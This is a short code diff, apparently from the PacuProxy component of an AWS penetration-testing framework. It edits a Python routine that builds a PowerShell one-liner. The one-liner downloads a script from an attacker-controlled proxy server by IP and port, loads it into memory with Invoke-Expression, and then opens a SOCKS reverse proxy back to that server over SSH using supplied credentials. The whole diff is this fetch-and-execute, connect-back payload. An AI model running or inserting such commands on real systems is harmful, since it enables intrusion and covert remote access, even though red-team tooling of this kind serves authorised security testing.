@@ -765,13 +765,13 @@ class Main:
                             # 4. Kill HTTP server
 
                             # Download the script from the PacuProxy server
-                            downloaded_string = '(New-Object System.Net.WebClient).DownloadString(\'http://{}:{}/{}\')'.format(proxy_ip, proxy_port, secret_string)
+                            downloaded_string = "(New-Object System.Net.WebClient).DownloadString('http://{}:5051/{}')".format(proxy_ip, secret_string)
                             
                             # Run Invoke-Expression on the downloaded script to import it to memory
                             invoke_expression = 'powershell iex({})'.format(downloaded_string)
                             
                             # Execute the newly imported script to start the reverse proxy
-                            start_proxy_cmd = 'powershell Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_ssh_username, proxy_ssh_password)
+                            start_proxy_cmd = 'Start-SocksProxy -sshhost {} -username {} -password {} -RemotePort 8001 -LocalPort 5050'.format(proxy_ip, proxy_ssh_username, proxy_ssh_password)
 
                             # Combine the commands into a one-liner
                             connect_back_cmd = '{}; {}'.format(invoke_expression, start_proxy_cmd)
